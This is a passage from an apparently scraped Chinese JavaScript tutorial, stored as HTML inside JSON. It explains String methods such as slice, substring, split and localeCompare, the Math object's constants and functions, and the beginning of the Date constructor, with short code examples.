&quot;𠮷&quot;</code></pre><p>上面代码中，<code>0x20BB7</code>拆成两个字符<code>0xD842</code>和<code>0xDFB7</code>（即两个两字节字符，合成一个四字节字符），就能得到正确的结果。码点大于<code>0xFFFF</code>的字符的四字节表示法，由 UTF-16 编码方法决定。</p>\n\n        <h2>\n            <a href='#实例属性' class='header-anchor'>#</a>\n            <span>实例属性</span>\n        </h2>\n    \n        <h3>\n            <a href='#String.prototype.length' class='header-anchor'>#</a>\n            <span>String.prototype.length</span>\n        </h3>\n    <p>字符串实例的<code>length</code>属性返回字符串的长度。</p>\n<pre class=\"prettyprint language-javascript\"><code>&#039;abc&#039;.length // 3</code></pre>\n        <h2>\n            <a href='#实例方法' class='header-anchor'>#</a>\n            <span>实例方法</span>\n        </h2>\n    \n        <h3>\n            <a href='#String.prototype.charAt()' class='header-anchor'>#</a>\n            <span>String.prototype.charAt()</span>\n        </h3>\n    <p><code>charAt</code>方法返回指定位置的字符，参数是从<code>0</code>开始编号的位置。</p>\n<pre class=\"prettyprint language-javascript\"><code>var s = new String(&#039;abc&#039;);\n\ns.charAt(1) // &quot;b&quot;\ns.charAt(s.length - 1) // &quot;c&quot;</code></pre><p>这个方法完全可以用数组下标替代。</p>\n<pre class=\"prettyprint language-javascript\"><code>&#039;abc&#039;.charAt(1) // &quot;b&quot;\n&#039;abc&#039;[1] // &quot;b&quot;</code></pre><p>如果参数为负数，或大于等于字符串的长度，<code>charAt</code>返回空字符串。</p>\n<pre class=\"prettyprint language-javascript\"><code>&#039;abc&#039;.charAt(-1) // &quot;&quot;\n&#039;abc&#039;.charAt(3) // &quot;&quot;</code></pre>\n        <h3>\n            <a href='#String.prototype.charCodeAt()' class='header-anchor'>#</a>\n            <span>String.prototype.charCodeAt()</span>\n        </h3>\n    <p><code>charCodeAt</code>方法返回字符串指定位置的 Unicode 码点（十进制表示），相当于<code>String.fromCharCode()</code>的逆操作。</p>\n<pre class=\"prettyprint language-javascript\"><code>&#039;abc&#039;.charCodeAt(1) // 98</code></pre><p>上面代码中，<code>abc</code>的<code>1</code>号位置的字符是<code>b</code>，它的 Unicode 码点是<code>98</code>。</p>\n<p>如果没有任何参数，<code>charCodeAt</code>返回首字符的 Unicode 码点。</p>\n<pre class=\"prettyprint language-javascript\"><code>&#039;abc&#039;.charCodeAt() // 97</code></pre><p>如果参数为负数，或大于等于字符串的长度，<code>charCodeAt</code>返回<code>NaN</code>。</p>\n<pre class=\"prettyprint language-javascript\"><code>&#039;abc&#039;.charCodeAt(-1) // NaN\n&#039;abc&#039;.charCodeAt(4) // NaN</code></pre><p>注意，<code>charCodeAt</code>方法返回的 Unicode 码点不会大于65536（0xFFFF），也就是说，只返回两个字节的字符的码点。如果遇到码点大于 65536 的字符（四个字节的字符），必需连续使用两次<code>charCodeAt</code>，不仅读入<code>charCodeAt(i)</code>，还要读入<code>charCodeAt(i+1)</code>，将两个值放在一起，才能得到准确的字符。</p>\n\n        <h3>\n            <a href='#String.prototype.concat()' class='header-anchor'>#</a>\n            <span>String.prototype.concat()</span>\n        </h3>\n    <p><code>concat</code>方法用于连接两个字符串，返回一个新字符串，不改变原字符串。</p>\n<pre class=\"prettyprint language-javascript\"><code>var s1 = &#039;abc&#039;;\nvar s2 = &#039;def&#039;;\n\ns1.concat(s2) // &quot;abcdef&quot;\ns1 // &quot;abc&quot;</code></pre><p>该方法可以接受多个参数。</p>\n<pre class=\"prettyprint language-javascript\"><code>&#039;a&#039;.concat(&#039;b&#039;, &#039;c&#039;) // &quot;abc&quot;</code></pre><p>如果参数不是字符串，<code>concat</code>方法会将其先转为字符串，然后再连接。</p>\n<pre class=\"prettyprint language-javascript\"><code>var one = 1;\nvar two = 2;\nvar three = &#039;3&#039;;\n\n&#039;&#039;.concat(one, two, three) // &quot;123&quot;\none + two + three // &quot;33&quot;</code></pre><p>上面代码中，<code>concat</code>方法将参数先转成字符串再连接，所以返回的是一个三个字符的字符串。作为对比，加号运算符在两个运算数都是数值时，不会转换类型，所以返回的是一个两个字符的字符串。</p>\n\n        <h3>\n            <a href='#String.prototype.slice()' class='header-anchor'>#</a>\n            <span>String.prototype.slice()</span>\n        </h3>\n    <p><code>slice</code>方法用于从原字符串取出子字符串并返回，不改变原字符串。它的第一个参数是子字符串的开始位置，第二个参数是子字符串的结束位置（不含该位置）。</p>\n<pre class=\"prettyprint language-javascript\"><code>&#039;JavaScript&#039;.slice(0, 4) // &quot;Java&quot;</code></pre><p>如果省略第二个参数，则表示子字符串一直到原字符串结束。</p>\n<pre class=\"prettyprint language-javascript\"><code>&#039;JavaScript&#039;.slice(4) // &quot;Script&quot;</code></pre><p>如果参数是负值，表示从结尾开始倒数计算的位置，即该负值加上字符串长度。</p>\n<pre class=\"prettyprint language-javascript\"><code>&#039;JavaScript&#039;.slice(-6) // &quot;Script&quot;\n&#039;JavaScript&#039;.slice(0, -6) // &quot;Java&quot;\n&#039;JavaScript&#039;.slice(-2, -1) // &quot;p&quot;</code></pre><p>如果第一个参数大于第二个参数，<code>slice</code>方法返回一个空字符串。</p>\n<pre class=\"prettyprint language-javascript\"><code>&#039;JavaScript&#039;.slice(2, 1) // &quot;&quot;</code></pre>\n        <h3>\n            <a href='#String.prototype.substring()' class='header-anchor'>#</a>\n            <span>String.prototype.substring()</span>\n        </h3>\n    <p><code>substring</code>方法用于从原字符串取出子字符串并返回，不改变原字符串，跟<code>slice</code>方法很相像。它的第一个参数表示子字符串的开始位置，第二个位置表示结束位置（返回结果不含该位置）。</p>\n<pre class=\"prettyprint language-javascript\"><code>&#039;JavaScript&#039;.substring(0, 4) // &quot;Java&quot;</code></pre><p>如果省略第二个参数，则表示子字符串一直到原字符串的结束。</p>\n<pre class=\"prettyprint language-javascript\"><code>&#039;JavaScript&#039;.substring(4) // &quot;Script&quot;</code></pre><p>如果第一个参数大于第二个参数，<code>substring</code>方法会自动更换两个参数的位置。</p>\n<pre class=\"prettyprint language-javascript\"><code>&#039;JavaScript&#039;.substring(10, 4) // &quot;Script&quot;\n// 等同于\n&#039;JavaScript&#039;.substring(4, 10) // &quot;Script&quot;</code></pre><p>上面代码中，调换<code>substring</code>方法的两个参数，都得到同样的结果。</p>\n<p>如果参数是负数，<code>substring</code>方法会自动将负数转为0。</p>\n<pre class=\"prettyprint language-javascript\"><code>&#039;Javascript&#039;.substring(-3) // &quot;JavaScript&quot;\n&#039;JavaScript&#039;.substring(4, -3) // &quot;Java&quot;</code></pre><p>上面代码中，第二个例子的参数<code>-3</code>会自动变成<code>0</code>，等同于<code>&#39;JavaScript&#39;.substring(4, 0)</code>。由于第二个参数小于第一个参数，会自动互换位置，所以返回<code>Java</code>。</p>\n<p>由于这些规则违反直觉，因此不建议使用<code>substring</code>方法，应该优先使用<code>slice</code>。</p>\n\n        <h3>\n            <a href='#String.prototype.substr()' class='header-anchor'>#</a>\n            <span>String.prototype.substr()</span>\n        </h3>\n    <p><code>substr</code>方法用于从原字符串取出子字符串并返回，不改变原字符串，跟<code>slice</code>和<code>substring</code>方法的作用相同。</p>\n<p><code>substr</code>方法的第一个参数是子字符串的开始位置（从0开始计算），第二个参数是子字符串的长度。</p>\n<pre class=\"prettyprint language-javascript\"><code>&#039;JavaScript&#039;.substr(4, 6) // &quot;Script&quot;</code></pre><p>如果省略第二个参数，则表示子字符串一直到原字符串的结束。</p>\n<pre class=\"prettyprint language-javascript\"><code>&#039;JavaScript&#039;.substr(4) // &quot;Script&quot;</code></pre><p>如果第一个参数是负数，表示倒数计算的字符位置。如果第二个参数是负数，将被自动转为0，因此会返回空字符串。</p>\n<pre class=\"prettyprint language-javascript\"><code>&#039;JavaScript&#039;.substr(-6) // &quot;Script&quot;\n&#039;JavaScript&#039;.substr(4, -1) // &quot;&quot;</code></pre><p>上面代码中，第二个例子的参数<code>-1</code>自动转为<code>0</code>，表示子字符串长度为<code>0</code>，所以返回空字符串。</p>\n\n        <h3>\n            <a href='#String.prototype.indexOf()，String.prototype.lastIndexOf()' class='header-anchor'>#</a>\n            <span>String.prototype.indexOf()，String.prototype.lastIndexOf()</span>\n        </h3>\n    <p><code>indexOf</code>方法用于确定一个字符串在另一个字符串中第一次出现的位置，返回结果是匹配开始的位置。如果返回<code>-1</code>，就表示不匹配。</p>\n<pre class=\"prettyprint language-javascript\"><code>&#039;hello world&#039;.indexOf(&#039;o&#039;) // 4\n&#039;JavaScript&#039;.indexOf(&#039;script&#039;) // -1</code></pre><p><code>indexOf</code>方法还可以接受第二个参数，表示从该位置开始向后匹配。</p>\n<pre class=\"prettyprint language-javascript\"><code>&#039;hello world&#039;.indexOf(&#039;o&#039;, 6) // 7</code></pre><p><code>lastIndexOf</code>方法的用法跟<code>indexOf</code>方法一致，主要的区别是<code>lastIndexOf</code>从尾部开始匹配，<code>indexOf</code>则是从头部开始匹配。</p>\n<pre class=\"prettyprint language-javascript\"><code>&#039;hello world&#039;.lastIndexOf(&#039;o&#039;) // 7</code></pre><p>另外，<code>lastIndexOf</code>的第二个参数表示从该位置起向前匹配。</p>\n<pre class=\"prettyprint language-javascript\"><code>&#039;hello world&#039;.lastIndexOf(&#039;o&#039;, 6) // 4</code></pre>\n        <h3>\n            <a href='#String.prototype.trim()' class='header-anchor'>#</a>\n            <span>String.prototype.trim()</span>\n        </h3>\n    <p><code>trim</code>方法用于去除字符串两端的空格，返回一个新字符串，不改变原字符串。</p>\n<pre class=\"prettyprint language-javascript\"><code>&#039;  hello world  &#039;.trim()\n// &quot;hello world&quot;</code></pre><p>该方法去除的不仅是空格，还包括制表符（<code>\\t</code>、<code>\\v</code>）、换行符（<code>\\n</code>）和回车符（<code>\\r</code>）。</p>\n<pre class=\"prettyprint language-javascript\"><code>&#039;\\r\\nabc \\t&#039;.trim() // &#039;abc&#039;</code></pre>\n        <h3>\n            <a href='#String.prototype.toLowerCase()，String.prototype.toUpperCase()' class='header-anchor'>#</a>\n            <span>String.prototype.toLowerCase()，String.prototype.toUpperCase()</span>\n        </h3>\n    <p><code>toLowerCase</code>方法用于将一个字符串全部转为小写，<code>toUpperCase</code>则是全部转为大写。它们都返回一个新字符串，不改变原字符串。</p>\n<pre class=\"prettyprint language-javascript\"><code>&#039;Hello World&#039;.toLowerCase()\n// &quot;hello world&quot;\n\n&#039;Hello World&#039;.toUpperCase()\n// &quot;HELLO WORLD&quot;</code></pre>\n        <h3>\n            <a href='#String.prototype.match()' class='header-anchor'>#</a>\n            <span>String.prototype.match()</span>\n        </h3>\n    <p><code>match</code>方法用于确定原字符串是否匹配某个子字符串，返回一个数组，成员为匹配的第一个字符串。如果没有找到匹配，则返回<code>null</code>。</p>\n<pre class=\"prettyprint language-javascript\"><code>&#039;cat, bat, sat, fat&#039;.match(&#039;at&#039;) // [&quot;at&quot;]\n&#039;cat, bat, sat, fat&#039;.match(&#039;xt&#039;) // null</code></pre><p>返回的数组还有<code>index</code>属性和<code>input</code>属性，分别表示匹配字符串开始的位置和原始字符串。</p>\n<pre class=\"prettyprint language-javascript\"><code>var matches = &#039;cat, bat, sat, fat&#039;.match(&#039;at&#039;);\nmatches.index // 1\nmatches.input // &quot;cat, bat, sat, fat&quot;</code></pre><p><code>match</code>方法还可以使用正则表达式作为参数，详见《正则表达式》一章。</p>\n\n        <h3>\n            <a href='#String.prototype.search()，String.prototype.replace()' class='header-anchor'>#</a>\n            <span>String.prototype.search()，String.prototype.replace()</span>\n        </h3>\n    <p><code>search</code>方法的用法基本等同于<code>match</code>，但是返回值为匹配的第一个位置。如果没有找到匹配，则返回<code>-1</code>。</p>\n<pre class=\"prettyprint language-javascript\"><code>&#039;cat, bat, sat, fat&#039;.search(&#039;at&#039;) // 1</code></pre><p><code>search</code>方法还可以使用正则表达式作为参数，详见《正则表达式》一节。</p>\n<p><code>replace</code>方法用于替换匹配的子字符串，一般情况下只替换第一个匹配（除非使用带有<code>g</code>修饰符的正则表达式）。</p>\n<pre class=\"prettyprint language-javascript\"><code>&#039;aaa&#039;.replace(&#039;a&#039;, &#039;b&#039;) // &quot;baa&quot;</code></pre><p><code>replace</code>方法还可以使用正则表达式作为参数，详见《正则表达式》一节。</p>\n\n        <h3>\n            <a href='#String.prototype.split()' class='header-anchor'>#</a>\n            <span>String.prototype.split()</span>\n        </h3>\n    <p><code>split</code>方法按照给定规则分割字符串，返回一个由分割出来的子字符串组成的数组。</p>\n<pre class=\"prettyprint language-javascript\"><code>&#039;a|b|c&#039;.split(&#039;|&#039;) // [&quot;a&quot;, &quot;b&quot;, &quot;c&quot;]</code></pre><p>如果分割规则为空字符串，则返回数组的成员是原字符串的每一个字符。</p>\n<pre class=\"prettyprint language-javascript\"><code>&#039;a|b|c&#039;.split(&#039;&#039;) // [&quot;a&quot;, &quot;|&quot;, &quot;b&quot;, &quot;|&quot;, &quot;c&quot;]</code></pre><p>如果省略参数，则返回数组的唯一成员就是原字符串。</p>\n<pre class=\"prettyprint language-javascript\"><code>&#039;a|b|c&#039;.split() // [&quot;a|b|c&quot;]</code></pre><p>如果满足分割规则的两个部分紧邻着（即两个分割符中间没有其他字符），则返回数组之中会有一个空字符串。</p>\n<pre class=\"prettyprint language-javascript\"><code>&#039;a||c&#039;.split(&#039;|&#039;) // [&#039;a&#039;, &#039;&#039;, &#039;c&#039;]</code></pre><p>如果满足分割规则的部分处于字符串的开头或结尾（即它的前面或后面没有其他字符），则返回数组的第一个或最后一个成员是一个空字符串。</p>\n<pre class=\"prettyprint language-javascript\"><code>&#039;|b|c&#039;.split(&#039;|&#039;) // [&quot;&quot;, &quot;b&quot;, &quot;c&quot;]\n&#039;a|b|&#039;.split(&#039;|&#039;) // [&quot;a&quot;, &quot;b&quot;, &quot;&quot;]</code></pre><p><code>split</code>方法还可以接受第二个参数，限定返回数组的最大成员数。</p>\n<pre class=\"prettyprint language-javascript\"><code>&#039;a|b|c&#039;.split(&#039;|&#039;, 0) // []\n&#039;a|b|c&#039;.split(&#039;|&#039;, 1) // [&quot;a&quot;]\n&#039;a|b|c&#039;.split(&#039;|&#039;, 2) // [&quot;a&quot;, &quot;b&quot;]\n&#039;a|b|c&#039;.split(&#039;|&#039;, 3) // [&quot;a&quot;, &quot;b&quot;, &quot;c&quot;]\n&#039;a|b|c&#039;.split(&#039;|&#039;, 4) // [&quot;a&quot;, &quot;b&quot;, &quot;c&quot;]</code></pre><p>上面代码中，<code>split</code>方法的第二个参数，决定了返回数组的成员数。</p>\n<p><code>split</code>方法还可以使用正则表达式作为参数，详见《正则表达式》一节。</p>\n\n        <h3>\n            <a href='#String.prototype.localeCompare()' class='header-anchor'>#</a>\n            <span>String.prototype.localeCompare()</span>\n        </h3>\n    <p><code>localeCompare</code>方法用于比较两个字符串。它返回一个整数，如果小于0，表示第一个字符串小于第二个字符串；如果等于0，表示两者相等；如果大于0，表示第一个字符串大于第二个字符串。</p>\n<pre class=\"prettyprint language-javascript\"><code>&#039;apple&#039;.localeCompare(&#039;banana&#039;) // -1\n&#039;apple&#039;.localeCompare(&#039;apple&#039;) // 0</code></pre><p>该方法的最大特点，就是会考虑自然语言的顺序。举例来说，正常情况下，大写的英文字母小于小写字母。</p>\n<pre class=\"prettyprint language-javascript\"><code>&#039;B&#039; &gt; &#039;a&#039; // false</code></pre><p>上面代码中，字母<code>B</code>小于字母<code>a</code>。因为 JavaScript 采用的是 Unicode 码点比较，<code>B</code>的码点是66，而<code>a</code>的码点是97。</p>\n<p>但是，<code>localeCompare</code>方法会考虑自然语言的排序情况，将<code>B</code>排在<code>a</code>的前面。</p>\n<pre class=\"prettyprint language-javascript\"><code>&#039;B&#039;.localeCompare(&#039;a&#039;) // 1</code></pre><p>上面代码中，<code>localeCompare</code>方法返回整数1，表示<code>B</code>较大。</p>\n<p><code>localeCompare</code>还可以有第二个参数，指定所使用的语言（默认是英语），然后根据该语言的规则进行比较。</p>\n<pre class=\"prettyprint language-javascript\"><code>&#039;ä&#039;.localeCompare(&#039;z&#039;, &#039;de&#039;) // -1\n&#039;ä&#039;.localeCompare(&#039;z&#039;, &#039;sv&#039;) // 1</code></pre><p>上面代码中，<code>de</code>表示德语，<code>sv</code>表示瑞典语。德语中，<code>ä</code>小于<code>z</code>，所以返回<code>-1</code>；瑞典语中，<code>ä</code>大于<code>z</code>，所以返回<code>1</code>。</p>\n\n        <h2>\n            <a href='#参考链接' class='header-anchor'>#</a>\n            <span>参考链接</span>\n        </h2>\n    <ul>\n<li>Ariya Hidayat, <a href=\"http://ariya.ofilabs.com/2014/02/javascript-string-substring-substr-slice.html\">JavaScript String: substring, substr, slice</a></li>\n</ul>\n"},{"context":[{"title":"教程","link":"javascript:void(0)"},{"title":"标准库","link":"javascript:void(0)"},{"title":"Math 对象","link":"/stdlib/math.html"}],"content":"\n        <h1>\n            <a href='#Math-对象' class='header-anchor'>#</a>\n            <span>Math 对象</span>\n        </h1>\n    <p><code>Math</code>是 JavaScript 的原生对象，提供各种数学功能。该对象不是构造函数，不能生成实例，所有的属性和方法都必须在<code>Math</code>对象上调用。</p>\n\n        <h2>\n            <a href='#静态属性' class='header-anchor'>#</a>\n            <span>静态属性</span>\n        </h2>\n    <p><code>Math</code>对象的静态属性，提供以下一些数学常数。</p>\n<ul>\n<li><code>Math.E</code>：常数<code>e</code>。</li>\n<li><code>Math.LN2</code>：2 的自然对数。</li>\n<li><code>Math.LN10</code>：10 的自然对数。</li>\n<li><code>Math.LOG2E</code>：以 2 为底的<code>e</code>的对数。</li>\n<li><code>Math.LOG10E</code>：以 10 为底的<code>e</code>的对数。</li>\n<li><code>Math.PI</code>：常数 Pi。</li>\n<li><code>Math.SQRT1_2</code>：0.5 的平方根。</li>\n<li><code>Math.SQRT2</code>：2 的平方根。</li>\n</ul>\n<pre class=\"prettyprint language-javascript\"><code>Math.E // 2.718281828459045\nMath.LN2 // 0.6931471805599453\nMath.LN10 // 2.302585092994046\nMath.LOG2E // 1.4426950408889634\nMath.LOG10E // 0.4342944819032518\nMath.PI // 3.141592653589793\nMath.SQRT1_2 // 0.7071067811865476\nMath.SQRT2 // 1.4142135623730951</code></pre><p>这些属性都是只读的，不能修改。</p>\n\n        <h2>\n            <a href='#静态方法' class='header-anchor'>#</a>\n            <span>静态方法</span>\n        </h2>\n    <p><code>Math</code>对象提供以下一些静态方法。</p>\n<ul>\n<li><code>Math.abs()</code>：绝对值</li>\n<li><code>Math.ceil()</code>：向上取整</li>\n<li><code>Math.floor()</code>：向下取整</li>\n<li><code>Math.max()</code>：最大值</li>\n<li><code>Math.min()</code>：最小值</li>\n<li><code>Math.pow()</code>：指数运算</li>\n<li><code>Math.sqrt()</code>：平方根</li>\n<li><code>Math.log()</code>：自然对数</li>\n<li><code>Math.exp()</code>：e的指数</li>\n<li><code>Math.round()</code>：四舍五入</li>\n<li><code>Math.random()</code>：随机数</li>\n</ul>\n\n        <h3>\n            <a href='#Math.abs()' class='header-anchor'>#</a>\n            <span>Math.abs()</span>\n        </h3>\n    <p><code>Math.abs</code>方法返回参数值的绝对值。</p>\n<pre class=\"prettyprint language-javascript\"><code>Math.abs(1) // 1\nMath.abs(-1) // 1</code></pre>\n        <h3>\n            <a href='#Math.max()，Math.min()' class='header-anchor'>#</a>\n            <span>Math.max()，Math.min()</span>\n        </h3>\n    <p><code>Math.max</code>方法返回参数之中最大的那个值，<code>Math.min</code>返回最小的那个值。如果参数为空, <code>Math.min</code>返回<code>Infinity</code>, <code>Math.max</code>返回<code>-Infinity</code>。</p>\n<pre class=\"prettyprint language-javascript\"><code>Math.max(2, -1, 5) // 5\nMath.min(2, -1, 5) // -1\nMath.min() // Infinity\nMath.max() // -Infinity</code></pre>\n        <h3>\n            <a href='#Math.floor()，Math.ceil()' class='header-anchor'>#</a>\n            <span>Math.floor()，Math.ceil()</span>\n        </h3>\n    <p><code>Math.floor</code>方法返回小于参数值的最大整数（地板值）。</p>\n<pre class=\"prettyprint language-javascript\"><code>Math.floor(3.2) // 3\nMath.floor(-3.2) // -4</code></pre><p><code>Math.ceil</code>方法返回大于参数值的最小整数（天花板值）。</p>\n<pre class=\"prettyprint language-javascript\"><code>Math.ceil(3.2) // 4\nMath.ceil(-3.2) // -3</code></pre><p>这两个方法可以结合起来，实现一个总是返回数值的整数部分的函数。</p>\n<pre class=\"prettyprint language-javascript\"><code>function ToInteger(x) {\n  x = Number(x);\n  return x &lt; 0 ? Math.ceil(x) : Math.floor(x);\n}\n\nToInteger(3.2) // 3\nToInteger(3.5) // 3\nToInteger(3.8) // 3\nToInteger(-3.2) // -3\nToInteger(-3.5) // -3\nToInteger(-3.8) // -3</code></pre><p>上面代码中，不管正数或负数，<code>ToInteger</code>函数总是返回一个数值的整数部分。</p>\n\n        <h3>\n            <a href='#Math.round()' class='header-anchor'>#</a>\n            <span>Math.round()</span>\n        </h3>\n    <p><code>Math.round</code>方法用于四舍五入。</p>\n<pre class=\"prettyprint language-javascript\"><code>Math.round(0.1) // 0\nMath.round(0.5) // 1\nMath.round(0.6) // 1\n\n// 等同于\nMath.floor(x + 0.5)</code></pre><p>注意，它对负数的处理（主要是对<code>0.5</code>的处理）。</p>\n<pre class=\"prettyprint language-javascript\"><code>Math.round(-1.1) // -1\nMath.round(-1.5) // -1\nMath.round(-1.6) // -2</code></pre>\n        <h3>\n            <a href='#Math.pow()' class='header-anchor'>#</a>\n            <span>Math.pow()</span>\n        </h3>\n    <p><code>Math.pow</code>方法返回以第一个参数为底数、第二个参数为幂的指数值。</p>\n<pre class=\"prettyprint language-javascript\"><code>// 等同于 2 ** 2\nMath.pow(2, 2) // 4\n// 等同于 2 ** 3\nMath.pow(2, 3) // 8</code></pre><p>下面是计算圆面积的方法。</p>\n<pre class=\"prettyprint language-javascript\"><code>var radius = 20;\nvar area = Math.PI * Math.pow(radius, 2);</code></pre>\n        <h3>\n            <a href='#Math.sqrt()' class='header-anchor'>#</a>\n            <span>Math.sqrt()</span>\n        </h3>\n    <p><code>Math.sqrt</code>方法返回参数值的平方根。如果参数是一个负值，则返回<code>NaN</code>。</p>\n<pre class=\"prettyprint language-javascript\"><code>Math.sqrt(4) // 2\nMath.sqrt(-4) // NaN</code></pre>\n        <h3>\n            <a href='#Math.log()' class='header-anchor'>#</a>\n            <span>Math.log()</span>\n        </h3>\n    <p><code>Math.log</code>方法返回以<code>e</code>为底的自然对数值。</p>\n<pre class=\"prettyprint language-javascript\"><code>Math.log(Math.E) // 1\nMath.log(10) // 2.302585092994046</code></pre><p>如果要计算以10为底的对数，可以先用<code>Math.log</code>求出自然对数，然后除以<code>Math.LN10</code>；求以2为底的对数，可以除以<code>Math.LN2</code>。</p>\n<pre class=\"prettyprint language-javascript\"><code>Math.log(100)/Math.LN10 // 2\nMath.log(8)/Math.LN2 // 3</code></pre>\n        <h3>\n            <a href='#Math.exp()' class='header-anchor'>#</a>\n            <span>Math.exp()</span>\n        </h3>\n    <p><code>Math.exp</code>方法返回常数<code>e</code>的参数次方。</p>\n<pre class=\"prettyprint language-javascript\"><code>Math.exp(1) // 2.718281828459045\nMath.exp(3) // 20.085536923187668</code></pre>\n        <h3>\n            <a href='#Math.random()' class='header-anchor'>#</a>\n            <span>Math.random()</span>\n        </h3>\n    <p><code>Math.random()</code>返回0到1之间的一个伪随机数，可能等于0，但是一定小于1。</p>\n<pre class=\"prettyprint language-javascript\"><code>Math.random() // 0.7151307314634323</code></pre><p>任意范围的随机数生成函数如下。</p>\n<pre class=\"prettyprint language-javascript\"><code>function getRandomArbitrary(min, max) {\n  return Math.random() * (max - min) + min;\n}\n\ngetRandomArbitrary(1.5, 6.5)\n// 2.4942810038223864</code></pre><p>任意范围的随机整数生成函数如下。</p>\n<pre class=\"prettyprint language-javascript\"><code>function getRandomInt(min, max) {\n  return Math.floor(Math.random() * (max - min + 1)) + min;\n}\n\ngetRandomInt(1, 6) // 5</code></pre><p>返回随机字符的例子如下。</p>\n<pre class=\"prettyprint language-javascript\"><code>function random_str(length) {\n  var ALPHABET = &#039;ABCDEFGHIJKLMNOPQRSTUVWXYZ&#039;;\n  ALPHABET += &#039;abcdefghijklmnopqrstuvwxyz&#039;;\n  ALPHABET += &#039;0123456789-_&#039;;\n  var str = &#039;&#039;;\n  for (var i=0; i &lt; length; ++i) {\n    var rand = Math.floor(Math.random() * ALPHABET.length);\n    str += ALPHABET.substring(rand, rand + 1);\n  }\n  return str;\n}\n\nrandom_str(6) // &quot;NdQKOr&quot;</code></pre><p>上面代码中，<code>random_str</code>函数接受一个整数作为参数，返回变量<code>ALPHABET</code>内的随机字符所组成的指定长度的字符串。</p>\n\n        <h3>\n            <a href='#三角函数方法' class='header-anchor'>#</a>\n            <span>三角函数方法</span>\n        </h3>\n    <p><code>Math</code>对象还提供一系列三角函数方法。</p>\n<ul>\n<li><code>Math.sin()</code>：返回参数的正弦（参数为弧度值）</li>\n<li><code>Math.cos()</code>：返回参数的余弦（参数为弧度值）</li>\n<li><code>Math.tan()</code>：返回参数的正切（参数为弧度值）</li>\n<li><code>Math.asin()</code>：返回参数的反正弦（返回值为弧度值）</li>\n<li><code>Math.acos()</code>：返回参数的反余弦（返回值为弧度值）</li>\n<li><code>Math.atan()</code>：返回参数的反正切（返回值为弧度值）</li>\n</ul>\n<pre class=\"prettyprint language-javascript\"><code>Math.sin(0) // 0\nMath.cos(0) // 1\nMath.tan(0) // 0\n\nMath.sin(Math.PI / 2) // 1\n\nMath.asin(1) // 1.5707963267948966\nMath.acos(1) // 0\nMath.atan(1) // 0.7853981633974483</code></pre>"},{"context":[{"title":"教程","link":"javascript:void(0)"},{"title":"标准库","link":"javascript:void(0)"},{"title":"Date 对象","link":"/stdlib/date.html"}],"content":"\n        <h1>\n            <a href='#Date-对象' class='header-anchor'>#</a>\n            <span>Date 对象</span>\n        </h1>\n    <p><code>Date</code>对象是 JavaScript 原生的时间库。它以1970年1月1日00:00:00作为时间的零点，可以表示的时间范围是前后各1亿天（单位为毫秒）。</p>\n\n        <h2>\n            <a href='#普通函数的用法' class='header-anchor'>#</a>\n            <span>普通函数的用法</span>\n        </h2>\n    <p><code>Date</code>对象可以作为普通函数直接调用，返回一个代表当前时间的字符串。</p>\n<pre class=\"prettyprint language-javascript\"><code>Date()\n// &quot;Tue Dec 01 2015 09:34:43 GMT+0800 (CST)&quot;</code></pre><p>注意，即使带有参数，<code>Date</code>作为普通函数使用时，返回的还是当前时间。</p>\n<pre class=\"prettyprint language-javascript\"><code>Date(2000, 1, 1)\n// &quot;Tue Dec 01 2015 09:34:43 GMT+0800 (CST)&quot;</code></pre><p>上面代码说明，无论有没有参数，直接调用<code>Date</code>总是返回当前时间。</p>\n\n        <h2>\n            <a href='#构造函数的用法' class='header-anchor'>#</a>\n            <span>构造函数的用法</span>\n        </h2>\n    <p><code>Date</code>还可以当作构造函数使用。对它使用<code>new</code>命令，会返回一个<code>Date</code>对象的实例。如果不加参数，实例代表的就是当前时间。</p>\n<pre class=\"prettyprint language-javascript\"><code>var today = new Date();</code></pre><p><code>Date</code>实例有一个独特的地方。其他对象求值的时候，都是默认调用<code>.valueOf()</code>方法，但是<code>Date</code>实例求值的时候，默认调用的是<code>toString()</code>方法。这导致对<code>Date</code>实例求值，返回的是一个字符串，代表该实例对应的时间。</p>\n<pre class=\"prettyprint language-javascript\"><code>var today = new Date();\n\ntoday\n// &quot;Tue Dec 01 2015 09:34:43 GMT+0800 (CST)&quot;\n\n// 等同于\ntoday.toString()\n// &quot;Tue Dec 01 2015 09:34:43 GMT+0800 (CST)&quot;</code></pre><p>上面代码中，<code>today</code>是<code>Date</code>的实例，直接求值等同于调用<code>toString</code>方法。</p>\n<p>作为构造函数时，<code>Date</code>对象可以接受多种格式的参数，返回一个该参数对应的时间实例。</p>\n<pre class=\"prettyprint language-javascript\"><code>// 参数为时间零点开始计算的毫秒数\nnew Date(1378218728000)\n// Tue Sep 03 2013 22:32:08 GMT+0800 (CST)\n\n// 参数为日期字符串\nnew Date(&#039;January 6, 2013&#039;);\n// Sun Jan 06 2013 00:00:00 GMT+0800 (CST)\n\n// 参数为多个整数，\n// 代表年、月、日、小时、分钟、秒、毫秒\nnew Date(2013, 0, 1, 0, 0, 0, 0)\n// Tue Jan 01 2013 00:00:00 GMT+0800 (CST)</code></pre><p>关于<code>Date</code>构造函数的参数，有几点说明。</p>\n<p>第一点，参数可以是负整数，代表1970年元旦之前的时间。</p>\n<pre class=\"prettyprint language-javascript\"><code>new Date(-1378218728000)\n// Fri Apr 30 1926 17:27:52 GMT+0800 (CST)</code></pre><p>第二点，只要是能被<code>Date.parse()</code>方法解析的字符串，都可以当作参数。</p>\n<pre class=\"prettyprint language-javascript\"><code>new Date(&#039;2013-2-15&#039;)\nnew Date(&#039;2013/2/15&#039;)\nnew Date(&#039;02/15/2013&#039;)\nnew Date(&#039;2013-FEB-15&#039;)\nnew Date(&#039;FEB, 15, 2013&#039;)\nnew Date(&#039;FEB 15, 2013&#039;)\nnew Date(&#039;Feberuary, 15, 2013&#039;)\nnew Date(&#039;Feberuary 15, 2013&#039;)\nnew Date(&#039;15 Feb 2013&#039;)\nnew Date(&#039;15, Feberuary, 2013&#039;)\n// Fri Feb 15 2013 00:00:00 GMT+0800 (CST)</code></pre><p>上面多种日期字符串的写法，返回的都是同一个时间。</p>\n<p>第三，参数为年、月、日等多个整数时，年和月是不能省略的，其他参数都可以省略的。也就是说，这时至少需要两个参数，因为如果只使用“年”这一个参数，<code>Date</code>会将其解释为毫秒数。</p>\n<pre class=\"prettyprint language-javascript\"><code>new Date(2013)\n// Thu Jan 01 1970 08:00:02 GMT+0800 (CST)</code></pre><p>上面代码中，2013被解释为毫秒数，而不是年份。</p>\n<pre class=\"prettyprint language-javascript\"><code>new Date(2013, 0)\n// Tue Jan 01 2013 00:00:00 GMT+0800 (CST)\nnew Date(2013, 0, 1)\n// Tue 